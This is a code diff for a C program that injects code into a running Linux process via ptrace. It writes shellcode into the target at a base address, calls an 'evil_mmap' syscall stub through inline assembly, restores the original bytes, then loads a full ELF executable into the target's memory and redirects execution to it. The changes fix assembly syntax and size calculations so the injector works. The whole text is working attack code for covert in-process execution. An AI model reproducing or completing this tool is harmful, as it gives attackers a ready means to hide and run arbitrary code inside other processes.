@@ -6,6 +6,7 @@
 #include <elf.h>
 #include <sys/mman.h>
 #include <syscall.h>
+#include <sys/stat.h>
 #include <signal.h>
 
 #include "ptrace_interface.h"
@@ -17,15 +18,15 @@ static inline volatile void *evil_mmap(void *addr, size_t length, int prot, int 
     unsigned long mmap_off = offset;
     unsigned int mmap_flags = flags;
     unsigned long ret;
-    __asm__ volatile("mov %0 %rdi\n"
-            "mov %1 %rsi\n"
-            "mov %2 %rdx\n"
-            "mov %3 %r10\n"
-            "mov %4 %r8\n"
-            "mov %5 %r9\n"
-            "mov %6 %rax\n"
+    __asm__ volatile("mov %0, %%rdi\n"
+            "mov %1,%%rsi\n"
+            "mov %2,%%rdx\n"
+            "mov %3,%%r10\n"
+            "mov %4,%%r8\n"
+            "mov %5,%%r9\n"
+            "mov %6,%%rax\n"
             "syscall\n":: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off), "g"(SYS_mmap));
-    asm volatile("mov %rax %0\n": "=r"(ret));
+    __asm__ volatile("mov %%rax, %0\n": "=r"(ret));
     return (void *)ret;
 }
 uint64_t injection_code(void *vaddr)
@@ -45,12 +46,14 @@ uint8_t *create_fn_shellcode(void (*fn)(), size_t len)
 }
 #define BASE_ADDRESS    0x100000
 #define WORD_ALIGN(x)   ((x+7) & ~7)
+void *f1 = injection_code;
+void *f2 = create_fn_shellcode;
 int main(int argc, char **argv)
 {
     pid_t pid;
     char *exec_path;
     Elf64_Addr base_addr;
-    unsigned long shellcode_size = 0;
+    unsigned long shellcode_size = f2 - f1;
     uint8_t *shellcode, *executable, *origcode;
     struct pt_regs pt_reg;
     struct stat st;
@@ -78,9 +81,9 @@ int main(int argc, char **argv)
 
     origcode = alloca(shellcode_size);
 
-    ptrace_read(origcode, shellcode_size, base_addr, pid);
+    ptrace_read((void *)origcode, shellcode_size, (void *)base_addr, pid);
 
-    ptrace_write(shellcode, shellcode_size, base_addr, pid);
+    ptrace_write((void *)shellcode, shellcode_size, (void *)base_addr, pid);
 
     ptrace(PTRACE_GETREGS, pid, NULL, &pt_reg);
     pt_reg.rip = base_addr;
@@ -97,7 +100,7 @@ int main(int argc, char **argv)
         exit(-1);
     }
 
-    ptrace_write(origcode, shellcode_size, base_addr, pid);
+    ptrace_write((void *)origcode, shellcode_size, (void *)base_addr, pid);
 
     fd = open(exec_path, O_RDONLY);
     fstat(fd, &st);
@@ -109,7 +112,7 @@ int main(int argc, char **argv)
 
     ehdr = (Elf64_Ehdr *)executable;
 
-    ptrace_write(executable, st.st_size, BASE_ADDRESS, pid);
+    ptrace_write(executable, st.st_size, (void *)BASE_ADDRESS, pid);
     ptrace(PTRACE_GETREGS, pid, NULL, &pt_reg);
     pt_reg.rip = BASE_ADDRESS + ehdr->e_entry;
 
